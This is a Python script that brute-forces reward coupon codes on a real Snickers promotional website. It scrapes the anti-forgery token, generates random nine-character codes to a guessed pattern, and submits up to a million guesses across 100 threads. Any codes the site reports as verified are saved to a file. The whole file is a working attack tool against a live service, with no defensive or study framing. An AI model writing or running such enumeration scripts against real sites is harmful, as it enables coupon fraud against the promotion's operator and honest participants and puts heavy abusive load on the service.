import concurrent.futures
import requests
from bs4 import BeautifulSoup
import string
import random
import time
from pytz import timezone
from datetime import datetime


get_url = "https://snickersexam.woohoo.in/claimreward"
post_url = "https://snickersexam.woohoo.in/ClaimReward/VerifyCode"
counter = 1
headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": r"Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 109.0.0.0 Safari / 537.36"
    }

place = r"Asia/Kolkata"

def generate_code(string_length=9):

    letters = string.ascii_uppercase
    digits = "".join(["3","4","6","7","8","9"])
    random_code = [random.choice(letters) for _ in range(string_length)]
    random_code[2] = random.choice(digits)
    random_code[4] = random.choice(digits)
    random_code[5] = random.choice(digits)

    return "".join(random_code)

def target_method():

    global counter

    # make GET request to URL
    response = requests.get(get_url,headers = headers)

    soup = BeautifulSoup(response.content, "html.parser")
    # extract token from response

    token = soup.find('input', {'name': '__RequestVerificationToken'}).get('value')

    code = generate_code()

    data = {
        "__RequestVerificationToken": token,
        "CouponType=": "",
        "couponcode": code,
        "mobilenumber": "",
        "userotp": "",
        "hdnlogin": "",
        "FirstName": "",
        "LastName": "",
        "City": ""
    }
    # make POST request to URL with token and cookies
    post_response = requests.post(post_url, data=data, cookies=response.cookies).text

    if "invalid" in post_response or "DOCTYPE" in post_response:
        pass
    elif "Verified" in post_response :
        print(f"\nCode found is {code} of Rs.50 at {counter} \n")
        with open("codes.txt", "a") as f:
            f.write(f"{code} : {datetime.now(timezone(place)).strftime('%H:%M:%S')}\n")
            f.close()

    counter += 1
    if not counter % 10000:
        print(f"\n.................... {counter} items checked ......................")


def main():
    # create a pool of 500 threads

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        for i in range(1000000):
            executor.submit(target_method)

if __name__ == "__main__":
    main()
